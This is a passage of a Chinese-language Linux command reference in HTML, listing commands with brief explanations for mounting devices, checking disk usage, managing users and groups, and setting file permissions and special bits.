sans-serif;background-color:rgb(255,255,255);\">mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>磁盘空间</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">df -h 显示已经挂载的分区列表</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls -lSr |more 以尺寸大小排列文件和目录</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">du -sh dir1 估算目录 'dir1' 已经使用的磁盘空间'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">rpm -q -a --qf '%10{SIZE}t%{NAME}n' | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dpkg-query -W -f='${Installed-Size;10}t${Package}n' | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>用户和群组</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">groupadd group_name 创建一个新用户组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">groupdel group_name 删除一个用户组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">groupmod -n new_group_name old_group_name 重命名一个用户组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">useradd -c \"Name Surname \" -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 \"admin\" 用户组的用户</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">useradd user1 创建一个新用户</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">userdel -r user1 删除一个用户 ( '-r' 排除主目录)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">usermod -c \"User FTP\" -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">passwd 修改口令</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">passwd user1 修改一个用户的口令 (只允许root执行)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chage -E 2005-12-31 user1 设置用户口令的失效期限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">pwck 检查 '/etc/passwd' 的文件格式和语法修正以及存在的用户</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">grpck 检查 '/etc/passwd' 的文件格式和语法修正以及存在的群组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>文件的权限 - 使用 \"+\" 设置权限，使用 \"-\" 用于取消</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls -lh 显示权限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chown user1 file1 改变一个文件的所有人属性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chgrp group1 file1 改变文件的群组</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chown user1:group1 file1 改变一个文件的所有人和群组属性</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod u-s /bin/file1 禁用一个二进制文件的 SUID位</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod g-s /home/public 禁用一个目录的 SGID 位</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">chmod o-t /home/public 禁用一个目录的 